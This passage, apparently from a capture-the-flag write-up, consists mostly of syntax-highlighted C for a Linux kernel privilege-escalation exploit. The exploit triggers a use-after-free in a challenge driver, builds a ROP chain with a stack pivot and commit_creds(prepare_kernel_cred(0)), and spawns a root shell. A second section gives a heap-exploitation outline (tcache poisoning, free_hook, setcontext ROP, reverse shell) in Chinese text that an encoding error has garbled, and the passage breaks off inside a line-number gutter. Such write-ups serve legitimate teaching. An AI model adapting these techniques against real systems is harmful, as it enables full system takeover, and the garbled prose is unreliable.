</span></span><span class=line><span class=cl>        <span class=k>for</span><span class=p>(</span><span class=kt>int</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=mi>4</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>){</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=n>buf</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>long</span><span class=p>)</span><span class=n>tmp</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>        char buf[0x81];
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>        memset(buf, &#39;M&#39;, 0x80);
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>        */</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>lock</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>while</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=nf>write</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=n>buf</span><span class=p>,</span> <span class=mh>0x20</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>tmp</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>shell</span><span class=p>(</span><span class=kt>void</span><span class=p>){</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=kt>char</span><span class=o>*</span> <span class=n>argv</span><span class=p>[]</span> <span class=o>=</span> <span class=p>{</span><span class=s>&#34;/bin/sh&#34;</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nf>execve</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=n>argv</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>setup_chunk_rop</span><span class=p>(</span><span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>kernel_base</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=kt>unsigned</span> <span class=kt>long</span> <span class=o>*</span><span class=n>rop</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=kt>int</span> <span class=n>i</span> <span class=o>=</span> <span class=p>(</span><span class=mh>0x1000000</span><span class=o>/</span><span class=mi>2</span><span class=p>)</span><span class=o>/</span><span class=mi>8</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>commit_creds</span> <span class=o>=</span> <span class=n>kernel_base</span> <span class=o>+</span> <span class=p>(</span><span class=mh>0xffffffff8108c360</span> <span class=o>-</span> <span class=mh>0xffffffff81000000</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>prepare_kernel_cred</span> <span class=o>=</span> <span class=n>kernel_base</span> <span class=o>+</span> <span class=p>(</span><span class=mh>0xffffffff8108c780</span> <span class=o>-</span> <span class=mh>0xffffffff81000000</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>pop_rdi</span> <span class=o>=</span> <span class=n>kernel_base</span> <span class=o>+</span> <span class=mh>0x16e9</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>mov_rdi_rax</span> <span class=o>=</span> <span class=n>kernel_base</span> <span class=o>+</span> <span class=p>(</span><span class=mh>0xffffffff813d7369</span> <span class=o>-</span> <span class=mh>0xffffffff81000000</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>mov_rdi_rax_rep</span> <span class=o>=</span> <span class=n>kernel_base</span> <span class=o>+</span> <span class=p>(</span><span class=mh>0xffffffff81aed04b</span> <span class=o>-</span> <span class=mh>0xffffffff81000000</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>pop_rcx</span> <span class=o>=</span> <span class=n>kernel_base</span> <span class=o>+</span> <span class=p>(</span><span class=mh>0xffffffff8101ed83</span> <span class=o>-</span> <span class=mh>0xffffffff81000000</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>mov_cr3_rdi</span> <span class=o>=</span> <span class=n>kernel_base</span> <span class=o>+</span> <span class=p>(</span><span class=mh>0xffffffff8105734a</span> <span class=o>-</span><span class=mh>0xffffffff81000000</span><span class=p>);</span> <span class=c1>//: mov cr3, rdi ; ret
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>        <span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>or_rax_rdx</span> <span class=o>=</span> <span class=n>kernel_base</span> <span class=o>+</span> <span class=p>(</span><span class=mh>0xffffffff81018d2c</span> <span class=o>-</span><span class=mh>0xffffffff81000000</span><span class=p>);</span> <span class=c1>//: or rax, rdx ; ret
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>        <span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>pop_rdx</span> <span class=o>=</span> <span class=n>kernel_base</span> <span class=o>+</span> <span class=p>(</span><span class=mh>0xffffffff8104abb7</span><span class=o>-</span><span class=mh>0xffffffff81000000</span><span class=p>);</span> <span class=c1>// pop rdx; ret
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>        <span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>pop_rax</span> <span class=o>=</span> <span class=n>kernel_base</span> <span class=o>+</span> <span class=p>(</span><span class=mh>0xffffffff8100ec67</span><span class=o>-</span><span class=mh>0xffffffff81000000</span><span class=p>);</span> <span class=c1>// pop rax; ret
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>        <span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>mov_rax_cr3</span> <span class=o>=</span> <span class=n>kernel_base</span> <span class=o>+</span> <span class=p>(</span><span class=mh>0xffffffff81057fab</span><span class=o>-</span><span class=mh>0xffffffff81000000</span><span class=p>);</span> <span class=c1>//: mov rax, cr3 ; mov cr3, rax ; ret
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>        <span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>mov_cr3_rax</span> <span class=o>=</span> <span class=n>kernel_base</span> <span class=o>+</span> <span class=p>(</span><span class=mh>0xffffffff81057fae</span> <span class=o>-</span> <span class=mh>0xffffffff81000000</span><span class=p>);</span><span class=c1>//: mov cr3, rax ; ret
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>        <span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>swapgs</span> <span class=o>=</span> <span class=n>kernel_base</span> <span class=o>+</span> <span class=p>(</span><span class=mh>0xffffffff81c00f58</span> <span class=o>-</span> <span class=mh>0xffffffff81000000</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>iretq</span> <span class=o>=</span> <span class=n>kernel_base</span> <span class=o>+</span> <span class=p>(</span><span class=mh>0xffffffff81024f92</span> <span class=o>-</span> <span class=mh>0xffffffff81000000</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>swapgs_restore</span> <span class=o>=</span> <span class=n>kernel_base</span> <span class=o>+</span> <span class=p>(</span><span class=mh>0xffffffff81c00e26</span> <span class=o>-</span> <span class=mh>0xffffffff81000000</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>                   0xffffffff816e19bc:        mov    esp,0x83000000
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>                   0xffffffff816e19c1:        ret 
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>        */</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>pivot</span> <span class=o>=</span> <span class=n>kernel_base</span> <span class=o>+</span> <span class=mh>0x6e19bc</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>rop</span> <span class=o>=</span> <span class=nf>mmap</span><span class=p>(</span><span class=mh>0x83000000</span><span class=o>-</span><span class=p>(</span><span class=mh>0x1000000</span><span class=o>/</span><span class=mi>2</span><span class=p>),</span> <span class=mh>0x1000000</span><span class=p>,</span> <span class=n>PROT_READ</span> <span class=o>|</span> <span class=n>PROT_WRITE</span><span class=p>,</span> <span class=n>MAP_PRIVATE</span> <span class=o>|</span> <span class=n>MAP_FIXED</span> <span class=o>|</span> <span class=n>MAP_ANONYMOUS</span><span class=p>,</span> <span class=o>-</span><span class=mi>1</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=p>(</span><span class=kt>int</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=mh>0x4</span> <span class=o>+</span> <span class=p>(</span><span class=mh>0x1000000</span><span class=o>/</span><span class=mi>2</span><span class=p>)</span><span class=o>/</span><span class=mi>8</span><span class=p>;)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=n>rop</span><span class=p>[</span><span class=n>i</span><span class=o>++</span><span class=p>]</span> <span class=o>=</span> <span class=mh>0xffffffff816e19bc</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1>//rop[i++] = mov_rax_cr3;
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>        <span class=c1>//rop[i++] = pop_rdx;
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>        <span class=c1>//rop[i++] = 0x1000;
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>        <span class=c1>//rop[i++] = or_rax_rdx;
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>        <span class=c1>//rop[i++] = mov_cr3_rax;
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>        <span class=n>rop</span><span class=p>[</span><span class=n>i</span><span class=o>++</span><span class=p>]</span> <span class=o>=</span> <span class=n>pop_rdi</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>rop</span><span class=p>[</span><span class=n>i</span><span class=o>++</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>rop</span><span class=p>[</span><span class=n>i</span><span class=o>++</span><span class=p>]</span> <span class=o>=</span> <span class=n>prepare_kernel_cred</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>rop</span><span class=p>[</span><span class=n>i</span><span class=o>++</span><span class=p>]</span> <span class=o>=</span> <span class=n>pop_rcx</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>rop</span><span class=p>[</span><span class=n>i</span><span class=o>++</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>rop</span><span class=p>[</span><span class=n>i</span><span class=o>++</span><span class=p>]</span> <span class=o>=</span> <span class=n>mov_rdi_rax_rep</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>rop</span><span class=p>[</span><span class=n>i</span><span class=o>++</span><span class=p>]</span> <span class=o>=</span> <span class=n>commit_creds</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>rop</span><span class=p>[</span><span class=n>i</span><span class=o>++</span><span class=p>]</span> <span class=o>=</span> <span class=n>swapgs_restore</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>rop</span><span class=p>[</span><span class=n>i</span><span class=o>++</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>rop</span><span class=p>[</span><span class=n>i</span><span class=o>++</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>rop</span><span class=p>[</span><span class=n>i</span><span class=o>++</span><span class=p>]</span> <span class=o>=</span> <span class=n>shell</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>rop</span><span class=p>[</span><span class=n>i</span><span class=o>++</span><span class=p>]</span> <span class=o>=</span> <span class=n>tf</span><span class=p>.</span><span class=n>cs</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>rop</span><span class=p>[</span><span class=n>i</span><span class=o>++</span><span class=p>]</span> <span class=o>=</span> <span class=n>tf</span><span class=p>.</span><span class=n>rflags</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>rop</span><span class=p>[</span><span class=n>i</span><span class=o>++</span><span class=p>]</span> <span class=o>=</span> <span class=n>tf</span><span class=p>.</span><span class=n>rsp</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>rop</span><span class=p>[</span><span class=n>i</span><span class=o>++</span><span class=p>]</span> <span class=o>=</span> <span class=n>tf</span><span class=p>.</span><span class=n>ss</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>rop</span><span class=p>[</span><span class=n>i</span><span class=o>++</span><span class=p>]</span> <span class=o>=</span> <span class=n>kernel_base</span> <span class=o>+</span><span class=p>(</span> <span class=mh>0xffffffff816e19bc</span> <span class=o>-</span> <span class=mh>0xffffffff81000000</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;ROP fake stack %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>rop</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// When testing when being already root.
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=kt>unsigned</span> <span class=kt>long</span> <span class=nf>get_text_base</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=kt>char</span> <span class=n>b</span><span class=p>[</span><span class=mh>0x10000</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=kt>char</span> <span class=o>*</span><span class=n>p</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=kt>int</span> <span class=n>ret</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>leak</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=kt>int</span> <span class=n>kmsg</span> <span class=o>=</span> <span class=nf>open</span><span class=p>(</span><span class=s>&#34;/dev/kmsg&#34;</span><span class=p>,</span> <span class=n>O_RDONLY</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nf>assert</span><span class=p>(</span><span class=n>kmsg</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>ret</span> <span class=o>=</span> <span class=nf>read</span><span class=p>(</span><span class=n>kmsg</span><span class=p>,</span> <span class=n>b</span><span class=p>,</span> <span class=mh>0x10000</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nf>assert</span><span class=p>(</span><span class=n>ret</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>p</span> <span class=o>=</span> <span class=nf>strchr</span><span class=p>(</span><span class=n>b</span><span class=p>,</span> <span class=mh>0xff</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>leak</span> <span class=o>=</span> <span class=nf>strtoul</span><span class=p>(</span><span class=n>p</span><span class=o>+</span><span class=mi>1</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=mi>10</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>leak</span> <span class=o>-=</span> <span class=mh>0x1f3ecd</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>leak</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=kt>char</span> <span class=o>*</span><span class=n>argv</span><span class=p>[])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=kt>char</span> <span class=n>buf</span><span class=p>[</span><span class=mh>0x81</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=kt>int</span> <span class=n>ret</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>kernel_base</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nf>save_state</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1>// open the target device driver.
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>        <span class=nf>open_target</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>ret</span> <span class=o>=</span> <span class=nf>ioctl</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=n>ALLOC</span><span class=p>,</span> <span class=mh>0x80</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nf>assert</span><span class=p>(</span><span class=n>ret</span> <span class=o>==</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1>//memset(buf, &#39;M&#39;, 0x80);
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>        <span class=nf>strcpy</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span> <span class=s>&#34;data : %lld %lld %lld %lld %lld </span><span class=se>\xff</span><span class=s>%lld %lld %lld %lld %lld %lld %lld %lld %lld %lld %lld %lld</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>ret</span> <span class=o>=</span> <span class=nf>write</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=n>buf</span><span class=p>,</span> <span class=mh>0x80</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nf>assert</span><span class=p>(</span><span class=n>ret</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1>// Trying to printk that data we wrote.
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>        <span class=n>ret</span> <span class=o>=</span> <span class=nf>ioctl</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=n>GET</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nf>assert</span><span class=p>(</span><span class=n>ret</span> <span class=o>==</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1>// trying to have the text base!
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>argc</span> <span class=o>==</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=nf>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>else</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=n>kernel_base</span> <span class=o>=</span> <span class=nf>strtoul</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=nb>NULL</span><span class=p>,</span> <span class=mi>16</span><span class=p>)</span> <span class=o>-</span> <span class=mh>0x1f3ecd</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1>//kernel_base = get_text_base();
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Kernel base %lx</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>kernel_base</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nf>setup_chunk_rop</span><span class=p>(</span><span class=n>kernel_base</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nf>getchar</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1>// trying to fill that freed chunk with struct subprocess_info
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>        <span class=c1>// Trying to bruteforce it.
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>        <span class=c1>//sleep(0.1);
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>        <span class=c1>// Trying to free our chunk for UAD
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>        <span class=n>ret</span> <span class=o>=</span> <span class=nf>ioctl</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=n>UAF</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nf>assert</span><span class=p>(</span><span class=n>ret</span> <span class=o>==</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=kt>pthread_t</span> <span class=n>tid</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nf>pthread_create</span><span class=p>(</span><span class=o>&amp;</span><span class=n>tid</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=n>memset_buf</span><span class=p>,</span> <span class=n>kernel_base</span> <span class=o>+</span> <span class=mh>0x6e19bc</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nf>sleep</span><span class=p>(</span><span class=mf>0.3</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>for</span><span class=p>(</span><span class=kt>int</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=mh>0x1</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=n>ret</span> <span class=o>=</span> <span class=nf>socket</span><span class=p>(</span><span class=mi>22</span><span class=p>,</span> <span class=n>AF_INET</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1>//write(fd, buf, 0x20);
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>        <span class=nf>sleep</span><span class=p>(</span><span class=mf>0.3</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>lock</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1>//printf(&#34;socket returned %d\n&#34;, ret);
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>        <span class=nf>getchar</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=christmas-wishes>Christmas Wishes</h3><p>æ¼æ´ç‚¹åœ¨parser_stringä¸­æ²¡æœ‰è€ƒè™‘è½¬ä¹‰"çš„æƒ…å†µ å¯¼è‡´å †æº¢å‡º</p><p>å­—ç¬¦ä¸²ä¸­ä¸èƒ½å†™\x00çš„é—®é¢˜ç”¨\u0000ç»•è¿‡ åŒç†å¯ä»¥ç”¨hex_parseå†™ä»»ä½•ä¸å¯è§å­—ç¬¦</p><p>æ§åˆ¶tcache fdä¸ºfree_hookåç”¨setcontext ropåå¼¹shellå‡ºæ¥å³å¯æ‰§è¡Œgift</p><p>è¿œç¨‹å¯å…ˆä½¿ç”¨readflagè¯»"/proc/self/maps" æ³„éœ²libcåœ°å€</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
